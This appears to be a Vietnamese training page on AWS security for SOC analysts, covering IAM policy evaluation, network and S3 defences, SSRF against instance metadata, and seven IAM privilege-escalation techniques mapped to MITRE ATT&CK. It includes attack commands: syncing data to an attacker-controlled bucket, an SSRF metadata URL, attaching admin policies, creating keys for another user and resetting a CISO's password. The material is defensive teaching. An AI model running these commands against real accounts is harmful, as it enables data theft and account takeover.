---
id: cloud-security-architecture-attacks
title: AWS Cloud Security & Attack Surfaces — Mô hình Bảo mật & Kỹ thuật Tấn công
sidebar_label: 2. Kiến trúc & Kỹ thuật Tấn công
sidebar_position: 2
description: Phân tích chuyên sâu kiến trúc an ninh AWS — Logic đánh giá quyền IAM, kỹ thuật phòng thủ mạng và S3, hiểm họa SSRF khai thác IMDSv1/v2, cùng 7 kỹ thuật leo thang đặc quyền (Privilege Escalation) kinh điển ánh xạ MITRE ATT&CK Cloud.
---

# AWS Cloud Security & Attack Surfaces — Mô hình Bảo mật & Kỹ thuật Tấn công

> Tài liệu phân tích chuyên sâu các mô hình an ninh kiến trúc, cơ chế kiểm soát truy cập phức hợp và các phương thức tấn công thực tế trên nền tảng AWS. Bài viết cung cấp góc nhìn của cả Red Team (kỹ thuật khai thác) lẫn Blue Team (cơ chế phòng vệ và bẫy phát hiện) dành cho SOC Analyst và Detection Engineer.

---

## 1. Tư duy An ninh Cloud: Identity is the New Perimeter

Trong kỷ nguyên đám mây, câu châm ngôn kinh điển của ngành an ninh thông tin là: **"Identity is the New Perimeter" (Danh tính là vành đai bảo vệ mới)**.

```
ON-PREMISES PERIMETER:              CLOUD SECURITY PERIMETER:
┌─────────────────────────┐         ┌──────────────────────────────────────────────┐
│  Firewall / VPN         │         │             IDENTITY & ACCESS (IAM)          │
│  Kiểm soát IP & Cổng    │         │       Xác thực ai đang gọi API?              │
│  (192.168.1.0/24 : 443) │         │    (User / Role / STS / Service Principal)   │
└────────────┬────────────┘         └──────────────────────┬───────────────────────┘
             ▼                                             ▼
┌─────────────────────────┐         ┌──────────────────────────────────────────────┐
│ Máy chủ trong mạng nội  │         │  Quyền hạn được phép thực hiện (Policy Eval) │
│ (Mặc định tin cậy)      │         │  (Action, Resource, Condition, Boundaries)   │
└─────────────────────────┘         └──────────────────────────────────────────────┘
```

Trong hệ thống On-Premises, nếu một máy chủ nội bộ bị lây nhiễm mã độc, kẻ tấn công phải dò quét mạng, tìm cổng mở và khai thác lỗ hổng để nhảy sang máy khác. Nhưng trên AWS:
- Mọi tài nguyên (EC2, S3, RDS, Lambda) đều liên kết trực tiếp với **IAM Role hoặc IAM Policy**.
- Nếu kẻ tấn công chiếm được một bộ thông tin xác thực (AWS Credentials) có quyền hạn rộng, chúng có thể gọi trực tiếp API từ bất kỳ đâu trên thế giới để lấy cắp dữ liệu hoặc phá hủy hạ tầng mà **không cần đi qua bất kỳ tường lửa mạng nào**.

---

## 2. Kiến trúc IAM Chuyên sâu & Cơ chế Ủy quyền Phức hợp

### 2.1 Bốn loại chính sách (Policies) cốt lõi

1. **Identity-based Policies (Chính sách gắn với danh tính):**
   - Gắn trực tiếp vào IAM User, IAM Group hoặc IAM Role.
   - Chia làm hai loại: **Managed Policies** (chính sách do AWS hoặc khách hàng tạo và quản lý độc lập, tái sử dụng được) và **Inline Policies** (chính sách nhúng chặt trực tiếp vào một identity cụ thể).
2. **Resource-based Policies (Chính sách gắn với tài nguyên):**
   - Được cấu hình trực tiếp trên chính tài nguyên đó (ví dụ: Amazon S3 Bucket Policy, AWS KMS Key Policy, Amazon SQS Queue Policy).
   - Khác với Identity-based policy, Resource-based policy bắt buộc phải chỉ định rõ trường **`Principal`** (ai, tài khoản nào được phép truy cập).
3. **IAM Role Trust Policies (Chính sách ủy thác):**
   - Là một dạng Resource-based policy gắn trên IAM Role để định nghĩa **ai được phép đảm nhận (Assume) Role này**.
   - Thường cấp quyền cho một dịch vụ AWS (ví dụ `Service: ec2.amazonaws.com`) hoặc một tài khoản AWS khác (Cross-Account Access).
4. **Permissions Boundaries & Service Control Policies (SCPs) — Cơ chế Trần quyền:**
   - **Permissions Boundary:** Gắn trên User hoặc Role để thiết lập **hạn mức quyền tối đa** mà danh tính đó có thể nhận được. Dù identity đó có được gán `AdministratorAccess`, quyền thực tế cũng không thể vượt qua ranh giới này.
   - **Service Control Policy (SCP):** Quản trị ở cấp độ AWS Organizations, áp dụng từ Root OU xuống các tài khoản con. SCP có quyền phủ quyết (Explicit Deny) cao nhất, ngay cả tài khoản Root của tài khoản con cũng không thể vượt qua SCP.

---

### 2.2 Thuật toán Đánh giá Quyền (Policy Evaluation Logic)

Khi một yêu cầu API được gửi tới AWS Control Plane, hệ thống đánh giá quyền theo quy trình nghiêm ngặt sau:

```
[ Request Gửi Tới AWS API ]
           │
           ▼
┌──────────────────────────────────────┐
│ Có "Explicit Deny" ở bất kỳ đâu?    │───(YES)───► [ KẾT QUẢ: TỪ CHỐI (DENY) ]
│ (SCP, Boundary, Identity, Resource)  │
└──────────────────┬───────────────────┘
                  (NO)
                   ▼
┌──────────────────────────────────────┐
│ Có thỏa mãn Service Control Policy?  │───(NO)────► [ KẾT QUẢ: TỪ CHỐI (DENY) ]
└──────────────────┬───────────────────┘
                  (YES)
                   ▼
┌──────────────────────────────────────┐
│ Nằm trong Permissions Boundary?      │───(NO)────► [ KẾT QUẢ: TỪ CHỐI (DENY) ]
└──────────────────┬───────────────────┘
                  (YES)
                   ▼
┌──────────────────────────────────────┐
│ Có ít nhất một "Explicit Allow"?     │───(NO)────► [ TỪ CHỐI MẶC ĐỊNH (IMPLICIT DENY) ]
│ (Identity Policy HOẶC Resource Policy│
└──────────────────┬───────────────────┘
                  (YES)
                   ▼
       [ KẾT QUẢ: CHO PHÉP (ALLOW) ]
```

> [!IMPORTANT]
> **Quy tắc vàng của IAM:**
> 1. Mặc định mọi hành động đều bị từ chối ngầm (**Implicit Deny**).
> 2. Phải có ít nhất một lệnh cho phép tường minh (**Explicit Allow**).
> 3. Một lệnh từ chối tường minh (**Explicit Deny**) ở bất kỳ chính sách nào sẽ **luôn luôn chiến thắng mọi lệnh Allow khác**.

---

### 2.3 Phân biệt Permanent Access Keys và STS Temporary Credentials

Khi phân tích log điều tra sự cố, SOC Analyst cần nhận biết loại thông tin xác thực dựa trên tiền tố của `AccessKeyId`:

| Tiền tố Key ID | Loại Credential | Nguồn gốc sinh ra | Đặc điểm bảo mật & Điều tra |
|---|---|---|---|
| **`AKIA...`** | Permanent Access Key | Tạo thủ công cho IAM User trong console/CLI. | **Tồn tại vĩnh viễn** cho đến khi bị xóa/deactivate. Nguy cơ rò rỉ rất cao trên GitHub/codebase. |
| **`ASIA...`** | Temporary Security Credentials | Do dịch vụ **AWS STS** sinh ra khi thực hiện `AssumeRole`, `GetSessionToken` hoặc từ EC2 Instance Profile. | **Có thời hạn** (từ 15 phút đến 12 giờ). Kèm theo một trường `SessionToken`. |
| **`AROA...`** | Unique Identifier | ID nội bộ đại diện cho một IAM Role. | Xuất hiện trong trường `userIdentity.principalId` của CloudTrail (`AROA...:session-name`). |
| **`AIDA...`** | Unique Identifier | ID nội bộ đại diện cho một IAM User. | Xuất hiện trong trường `userIdentity.principalId` khi user tương tác qua API. |

---

## 3. Bảo mật Mạng & Kiến trúc Cách ly Hạ tầng (Network Security)

### 3.1 So sánh chi tiết: Security Group vs Network ACL (NACL)

Trong môi trường Amazon VPC, hai lớp tường lửa ảo hoạt động phối hợp để bảo vệ mạng:

| Tiêu chí | Security Group (SG) | Network ACL (NACL) |
|---|---|---|
| **Cấp độ hoạt động** | Cấp độ giao diện mạng ảo của máy chủ (**ENI / Instance level**). | Cấp độ phân vùng mạng (**Subnet level**). |
| **Trạng thái kết nối** | **Stateful** (Nếu mở Inbound, traffic phản hồi Outbound tự động được cho phép và ngược lại). | **Stateless** (Phải cấu hình tường minh cả chiều vào lẫn chiều ra; phải mở dải Ephemeral Ports cho chiều về). |
| **Loại luật hỗ trợ** | Chỉ hỗ trợ luật cho phép (**Allow**). Không thể cấu hình cấm IP cụ thể. | Hỗ trợ cả luật cho phép (**Allow**) và luật cấm tường minh (**Deny**). |
| **Thứ tự thực thi** | Toàn bộ rules được đánh giá đồng thời. | Đánh giá tuần tự theo số thứ tự luật (**Rule Number** từ nhỏ đến lớn; gặp luật khớp đầu tiên sẽ dừng). |
| **Sử dụng cho SOC** | Quản lý kiểm soát truy cập thông thường theo dịch vụ. | Chặn khẩn cấp các IP tấn công/C2 độc hại (**Emergency IP Blacklisting**) ở cấp độ subnet. |

---

### 3.2 Hiểm họa Exfiltration qua S3 & Giải pháp VPC Endpoints

Trong kiến trúc mạng doanh nghiệp thông thường, một máy chủ EC2 nằm trong Private Subnet khi cần gọi S3 sẽ phải đi qua NAT Gateway ra Internet. Điều này dẫn đến một kịch bản rò rỉ dữ liệu nguy hiểm:
- Kẻ tấn công sau khi chiếm được quyền shell trên máy chủ nội bộ sẽ thực hiện:
  ```bash
  # Tải toàn bộ dữ liệu nội bộ đẩy sang một S3 bucket do chính attacker sở hữu bên ngoài
  aws s3 sync /var/data/customer-records/ s3://attacker-controlled-bucket-2026/
  ```
- Do máy chủ có đường Internet ra ngoài và S3 là public endpoint, lệnh sync này sẽ thành công hoàn toàn mà tường lửa thông thường không phát hiện được.

```
KIẾN TRÚC AN TOÀN VỚI VPC ENDPOINT POLICY:
┌────────────────────────────────────────────────────────┐
│                      AMAZON VPC                        │
│  ┌───────────────────────┐                             │
│  │ Private EC2 Instance  │                             │
│  └───────────┬───────────┘                             │
│              │ (Traffic nội bộ AWS Backbone)           │
│              ▼                                         │
│  ┌──────────────────────────────────────────────────┐  │
│  │ S3 Gateway Endpoint                              │  │
│  │ Policy: CHỈ CHO PHÉP TRUY CẬP BUCKET NỘI BỘ     │  │
│  └───────────────────────────┬──────────────────────┘  │
└──────────────────────────────┼─────────────────────────┘
                               ▼
            ┌──────────────────────────────────────┐
            │ S3 Bucket Công Ty: [ ALLOWED ]       │
            ├──────────────────────────────────────┤
            │ S3 Bucket Attacker: [ BLOCKED 403 ]  │
            └──────────────────────────────────────┘
```

**Biện pháp giải quyết:** Triển khai **VPC Gateway Endpoint for S3** kết hợp gắn **VPC Endpoint Policy**. Chính sách này quy định máy chủ trong VPC chỉ được phép gọi các bucket thuộc sở hữu của tổ chức:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowAccessToInternalBucketsOnly",
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::my-company-data-bucket",
        "arn:aws:s3:::my-company-data-bucket/*"
      ],
      "Condition": {
        "StringEquals": {
          "aws:PrincipalAccount": "123456789012"
        }
      }
    }
  ]
}
```

---

### 3.3 Loại bỏ Bastion Host & Quản trị Không Cổng Mở với AWS SSM

Mô hình cũ sử dụng máy chủ trung chuyển (Bastion Host / Jump Box) mở cổng 22 SSH ra Internet tiềm ẩn nguy cơ bị dò quét mật khẩu (Brute-force) và lộ lọt SSH Private Key.

**Mô hình hiện đại:** Thay thế toàn bộ bằng **AWS Systems Manager (SSM) Session Manager**:
- **Không cần mở bất kỳ cổng Inbound nào** trên Security Group (kể cả cổng 22 hay 3389).
- Máy chủ EC2 chạy một tiến trình ngầm (`amazon-ssm-agent`), chỉ mở kết nối **Outbound HTTPS (TCP 443)** tới AWS SSM API Endpoint.
- Kỹ sư xác thực thông qua IAM Identity (kèm MFA) và mở phiên tương tác shell thông qua giao diện Console hoặc AWS CLI:
  ```bash
  aws ssm start-session --target i-0123456789abcdef0
  ```
- **Lợi ích tuyệt đối cho SOC:** Toàn bộ lệnh gõ (Keystroke logging) và dữ liệu hiển thị trong phiên terminal đều được tự động mã hóa và ghi lưu đầy đủ vào **S3 Bucket hoặc CloudWatch Logs**. SOC có thể playback lại toàn bộ hành vi của quản trị viên hoặc kẻ tấn công.

---

## 4. Bảo mật Lưu trữ S3 & Kỹ thuật Rò rỉ Dữ liệu

### 4.1 Cơ chế S3 Block Public Access (BPA) — 4 Tầng Phòng vệ

S3 Block Public Access là lớp khóa an toàn trung tâm (Kill-switch) có thể bật ở cấp độ toàn bộ tài khoản AWS hoặc trên từng S3 Bucket cụ thể. Nó bao gồm 4 cờ cấu hình độc lập:

1. **`BlockPublicAcls`:** Chặn không cho người dùng thêm bất kỳ Object ACL hoặc Bucket ACL mới nào có tính chất công khai.
2. **`IgnorePublicAcls`:** Bỏ qua toàn bộ các Public ACLs hiện có trong bucket (vô hiệu hóa các ACL công khai sẵn có).
3. **`BlockPublicPolicy`:** Chặn không cho phép lưu lại các Bucket Policy mới nếu chính sách đó cấp quyền công khai (Public).
4. **`RestrictPublicBuckets`:** Giới hạn quyền truy cập vào bucket có policy công khai chỉ cho các dịch vụ AWS nội bộ và user thuộc tài khoản sở hữu.

> **Khuyến nghị cho SOC:** Kiểm tra định kỳ bằng AWS Config hoặc CLI để đảm bảo toàn bộ 4 thiết lập này luôn ở trạng thái `True` trên mọi bucket (trừ các bucket chuyên dụng làm static website công khai).

---

### 4.2 Mã hóa Lưu trữ & Chiều sâu của KMS Key Policy

AWS hỗ trợ ba cơ chế mã hóa dữ liệu tại chỗ (Encryption at Rest) trên S3:
- **SSE-S3:** Mã hóa bằng khóa do S3 tự quản lý (`AES-256`). Miễn phí, nhưng không kiểm soát được ai có quyền giải mã ngoài quyền S3.
- **SSE-KMS (Khuyến nghị chuẩn Enterprise):** Dùng khóa **Customer Managed Key (CMK)** trong dịch vụ AWS Key Management Service.
  - *Ý nghĩa then chốt cho SOC:* Ngay cả khi một kẻ tấn công hoặc một nhân sự bất mãn có quyền `s3:GetObject` trên bucket, nhưng nếu họ **không có quyền `kms:Decrypt` trên Key Policy của khóa KMS**, họ vẫn hoàn toàn **không thể đọc được nội dung tệp tin**.
- **SSE-C:** Khách hàng tự truyền khóa mã hóa trong từng HTTP header của request.

**Bắt buộc mã hóa truyền tải (In Transit) qua Bucket Policy:**
Để ngăn chặn tấn công trung gian (Man-in-the-Middle) và đáp ứng chuẩn PCI-DSS, cấu hình bucket policy từ chối mọi request không dùng giao thức HTTPS:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "EnforceTLSRequestsOnly",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::secure-company-vault",
        "arn:aws:s3:::secure-company-vault/*"
      ],
      "Condition": {
        "Bool": {
          "aws:SecureTransport": "false"
        }
      }
    }
  ]
}
```

---

## 5. Bảo mật Compute & Hiểm họa Instance Metadata Service (IMDS)

### 5.1 Bản chất của IMDS và Kịch bản Tấn công SSRF

Instance Metadata Service (IMDS) là một dịch vụ nội bộ chạy tại địa chỉ IP Link-local **`169.254.169.254`**, chỉ có thể truy cập được từ bên trong hệ điều hành của máy ảo EC2.

IMDS cung cấp thông tin cấu hình máy chủ, và đặc biệt là **Security Credentials tạm thời của IAM Role được gắn vào máy chủ đó**:

```
KỊCH BẢN TẤN CÔNG SSRF -> IMDSv1 ĐÁNH CẮP CREDENTIALS:

[ Attacker ]
     │ 1. Gửi HTTP Request khai thác SSRF trên Web App:
     │    https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/WebRole
     ▼
[ Web App EC2 Server ]
     │ 2. Web App (bị lỗi) tự động gọi curl tới địa chỉ nội bộ Link-local:
     ▼    GET http://169.254.169.254/latest/meta-data/iam/security-credentials/WebRole
[ IMDSv1 Endpoint (169.254.169.254) ]
     │ 3. Trả về JSON chứa credentials tạm thời:
     │    {
     │      "AccessKeyId": "ASIAVEXAMPLE...",
     │      "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
     │      "Token": "IQoJb3JpZ2luX2VjE...",
     │      "Expiration": "2026-10-08T12:00:00Z"
     │    }
     ▼
[ Attacker ]
     │ 4. Nhận được JSON credentials qua kết quả phản hồi của Web App.
     ▼
[ Máy Attacker Bên Ngoài ]
     │ 5. Đưa credentials vào AWS CLI máy cá nhân và gọi API:
     │    aws s3 ls --profile stolen
     ▼
[ AWS Cloud Control Plane ] ──► (Cho phép truy cập vì Token hợp lệ!)
```

Đây chính là chuỗi tấn công kinh điển trong vụ rò rỉ dữ liệu chấn động **Capital One (2019)**, khiến hơn 100 triệu hồ sơ khách hàng bị đánh cắp thông qua một máy chủ WAF cấu hình sai bị dính SSRF.

---

### 5.2 Giải pháp Triệt để: IMDSv2

Để vô hiệu hóa hoàn toàn kỹ thuật tấn công trên, AWS đã phát triển **IMDSv2** hoạt động theo cơ chế Session-oriented:

1. **Bước 1 — Yêu cầu tạo phiên (Session Token):** Ứng dụng phải gửi một HTTP request với phương thức **`PUT`** (kèm header bắt buộc chỉ định thời gian sống TTL của token):
   ```bash
   TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" \
        -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
   ```
2. **Bước 2 — Sử dụng Token để lấy thông tin:** Dùng token vừa nhận được truyền vào header **`X-aws-ec2-metadata-token`**:
   ```bash
   curl -H "X-aws-ec2-metadata-token: $TOKEN" \
        http://169.254.169.254/latest/meta-data/iam/security-credentials/WebRole
   ```

**Tại sao IMDSv2 chặn đứng SSRF?**
- Phần lớn các lỗ hổng SSRF trên ứng dụng web chỉ cho phép kẻ tấn công điều khiển đường dẫn URL cho phương thức `GET` hoặc `POST`. Chúng **không thể ép buộc máy chủ web gửi method `PUT` kèm theo custom HTTP header** (`X-aws-ec2-metadata-token-ttl-seconds`).
- **Cấu hình Hop Limit = 1:** Thiết lập giới hạn số bước nhảy mạng (TTL của gói tin IP) bằng 1. Nếu kẻ tấn công chiếm được một container chạy bên trong EC2, gói tin request tới `169.254.169.254` khi vượt qua ranh giới bridge network của container sẽ bị giảm hop count về 0 và bị hủy ngay lập tức.

**Lệnh bắt buộc chuyển dịch sang IMDSv2:**
```bash
aws ec2 modify-instance-metadata-options \
    --instance-id i-0123456789abcdef0 \
    --http-tokens required \
    --http-put-response-hop-limit 1
```

---

## 6. Ma trận Kỹ thuật Tấn công & 7 Phương thức Leo thang Đặc quyền (Privilege Escalation)

Trong môi trường AWS, kẻ tấn công sau khi có được một tài khoản cấp thấp sẽ liên tục tìm kiếm các quyền hạn tiềm ẩn để tự nâng cấp quyền của mình lên ngang hàng `AdministratorAccess`.

Dưới đây là 7 kỹ thuật leo thang đặc quyền IAM kinh điển (nghiên cứu bởi Rhino Security Labs):

### Kỹ thuật 1: `iam:PassRole` kết hợp `lambda:CreateFunction` / `lambda:InvokeFunction`
- **Cơ chế:** Kẻ tấn công có quyền tạo hàm Lambda và có quyền gán một IAM Role đã tồn tại (`iam:PassRole`) cho hàm đó. Nếu trong tài khoản có sẵn một Role dành cho quản trị viên (ví dụ `AdminExecutionRole`), kẻ tấn công sẽ:
  1. Viết một hàm Lambda đơn giản chứa mã code tạo thêm một Admin User mới hoặc gắn policy `AdministratorAccess` cho tài khoản của chúng.
  2. Cấu hình gán `AdminExecutionRole` cho hàm Lambda này.
  3. Gọi kích hoạt hàm (`lambda:InvokeFunction`) để thực thi quyền lực tối cao đó.
- **Phát hiện:** Giám sát sự kiện `CreateFunction` đi kèm các IAM Role có quyền nhạy cảm trong `requestParameters.role`.

### Kỹ thuật 2: `iam:CreatePolicyVersion`
- **Cơ chế:** Một Managed Policy trong AWS có thể lưu tối đa 5 phiên bản (version). Nếu kẻ tấn công có quyền `iam:CreatePolicyVersion` trên một policy đang gắn vào chính tài khoản của chúng:
  - Chúng tạo một version mới có nội dung `Action: "*", Resource: "*", Effect: "Allow"`.
  - Đặt cờ `--set-as-default`. Ngay lập tức, tài khoản của chúng trở thành Admin toàn quyền.
- **Phát hiện:** Cảnh báo ngay khi xuất hiện sự kiện `CreatePolicyVersion` có chứa `Effect: Allow` và `Action: *`.

### Kỹ thuật 3: `iam:SetDefaultPolicyVersion`
- **Cơ chế:** Tương tự kỹ thuật 2, nhưng người quản trị trước đây đã từng tạo một version cũ có quyền admin và sau đó chuyển sang version an toàn hơn. Kẻ tấn công chỉ cần gọi `SetDefaultPolicyVersion` trỏ về version cũ có quyền admin đó.

### Kỹ thuật 4: `iam:AttachUserPolicy` / `iam:AttachRolePolicy` / `iam:AttachGroupPolicy`
- **Cơ chế:** Kẻ tấn công có quyền gắn chính sách vào user hoặc role. Hành động đơn giản nhất:
  ```bash
  aws iam attach-user-policy \
      --user-name attacker-user \
      --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
  ```

### Kỹ thuật 5: `iam:PutUserPolicy` / `iam:PutRolePolicy`
- **Cơ chế:** Tự tạo một chính sách nội dòng (**Inline Policy**) gắn trực tiếp vào chính mình với toàn bộ quyền hạn. Kỹ thuật này thường bị bỏ sót nếu quản trị viên chỉ giám sát Managed Policies.

### Kỹ thuật 6: `iam:CreateAccessKey` trên tài khoản User khác
- **Cơ chế:** Kẻ tấn công không có quyền admin trực tiếp, nhưng lại có quyền tạo access key trên user khác. Chúng nhắm vào tài khoản của Trưởng nhóm IT hoặc Security Admin:
  ```bash
  aws iam create-access-key --user-name devops-lead-admin
  ```
  AWS trả về một cặp `AccessKeyId` và `SecretAccessKey` mới của `devops-lead-admin`. Kẻ tấn công chỉ việc cấu hình key này để đăng nhập dưới danh tính của Admin.

### Kỹ thuật 7: `iam:UpdateLoginProfile`
- **Cơ chế:** Tương tự kỹ thuật 6, nhưng thay vì tạo Access Key, kẻ tấn công trực tiếp **đặt lại mật khẩu đăng nhập web console** của một người dùng khác:
  ```bash
  aws iam update-login-profile \
      --user-name ciso-account \
      --password "NewCompromisedPassw0rd!" \
      --no-password-reset-required
  ```

---

## 7. Ánh xạ Ma trận MITRE ATT&CK for Cloud (Enterprise Matrix)

Để hệ thống hóa các chỉ dấu tấn công (IoCs/TTPs) phục vụ việc xây dựng detection rule, toàn bộ các hành vi trên AWS được ánh xạ vào khung chuẩn quốc tế MITRE ATT&CK Cloud:

| Chiến thuật (Tactic) | Kỹ thuật (Technique ID) | Tên kỹ thuật | Hành vi điển hình trên AWS |
|---|---|---|---|
| **Initial Access** | `T1078.004` | Valid Accounts: Cloud Accounts | Đăng nhập bằng Access Key bị lộ trên GitHub hoặc đánh cắp qua Phishing. |
| **Execution** | `T1059.009` | Cloud Hosted Engine | Chạy lệnh từ xa trên máy ảo thông qua `ssm:SendCommand` hoặc gọi hàm Lambda. |
| **Persistence** | `T1098.001` | Account Manipulation: Additional Cloud Credentials | Tạo thêm Access Key mới (`CreateAccessKey`) hoặc thêm SSH Key vào EC2 instance. |
| **Privilege Escalation** | `T1548` | Abuse Elevation Control Mechanism | Sử dụng các kỹ thuật `PassRole`, `CreatePolicyVersion` để nâng quyền tài khoản. |
| **Defense Evasion** | `T1562.008` | Impair Defenses: Disable Cloud Logs | Tắt CloudTrail (`StopLogging`, `DeleteTrail`) hoặc xóa GuardDuty detector. |
| **Credential Access** | `T1552.005` | Unsecured Credentials: Cloud Instance Metadata API | Tấn công SSRF trích xuất token tạm thời từ IMDS `169.254.169.254`. |
| **Discovery** | `T1526` | Cloud Service Discovery | Chạy các lệnh dò quét quyền (`GetCallerIdentity`, `ListUsers`, `DescribeInstances`). |
| **Exfiltration** | `T1537` | Transfer Data to Cloud Account | Sao chép S3 bucket nội bộ sang bucket ngoài hoặc share EBS/RDS Snapshot sang tài khoản khác. |
| **Impact** | `T1496` | Resource Hijacking | Khởi tạo hàng loạt EC2 cấu hình khủng tại các Region xa lạ để đào tiền ảo (Cryptomining). |

---

## 8. Khung Quản trị Cấu hình An ninh (CSPM) & Tuân thủ Doanh nghiệp

- **CIS AWS Foundations Benchmark:** Bộ tiêu chuẩn quốc tế gồm hơn 50 khuyến nghị kiểm tra an ninh (ví dụ: cấm dùng Root account, bắt buộc bật MFA cho tài khoản console, cấm mở port 22/3389 ra 0.0.0.0/0, bắt buộc bật CloudTrail đa Region).
- **AWS Security Hub:** Đóng vai trò là nền tảng **CSPM (Cloud Security Posture Management)** trung tâm, tự động quét toàn bộ tài khoản AWS so với các chuẩn CIS Benchmark, PCI-DSS, AWS Foundational Security Best Practices và chấm điểm mức độ tuân thủ (Security Score 0–100%).
- **AWS Config:** Giám sát liên tục mọi thay đổi trạng thái cấu hình (Configuration Drift) của tài nguyên. Nếu một S3 bucket bất ngờ bị gỡ bỏ cờ mã hóa, AWS Config sẽ kích hoạt sự kiện vi phạm (Non-compliant) và gửi cảnh báo tới SOC.

---

## 9. Bài tập Thực hành & Tình huống Tự kiểm tra

1. **Câu hỏi 1:** Một kỹ sư lập trình báo cáo rằng họ không thể truy cập vào S3 bucket của công ty mặc dù IAM User của họ đã được gắn quyền `AdministratorAccess`. Phân tích 3 lý do khả dĩ nhất dựa trên thuật toán đánh giá quyền IAM?
   *(Gợi ý: 1. Có Explicit Deny trong S3 Bucket Policy; 2. Bị chặn bởi Service Control Policy (SCP) ở cấp độ Organizations; 3. Bị chặn bởi Permissions Boundary gán trên User).*

2. **Câu hỏi 2:** Trong một cuộc điều tra sự cố, SOC ghi nhận một chuỗi sự kiện API call xuất hiện từ IP lạ sử dụng Access Key bắt đầu bằng tiền tố `ASIA...`. Điều này nói lên điều gì về nguồn gốc của thông tin xác thực bị lộ? Kẻ tấn công có thể đã đánh cắp nó từ đâu?
   *(Gợi ý: Đây là STS Temporary Credentials; có thể do kẻ tấn công đã assume một role hợp lệ, hoặc khai thác thành công SSRF lấy cắp từ Instance Profile của máy ảo EC2).*

3. **Câu hỏi 3:** Tại sao việc cấu hình IMDSv2 và đặt `http-put-response-hop-limit` bằng 1 lại là biện pháp bảo vệ cốt tử cho các ứng dụng chạy trong môi trường Container (Docker/Kubernetes) trên EC2?
   *(Gợi ý: Hop limit = 1 ngăn không cho gói tin mạng xuất phát từ bên trong container bridge network vượt qua host để tiếp cận link-local IP 169.254.169.254).*
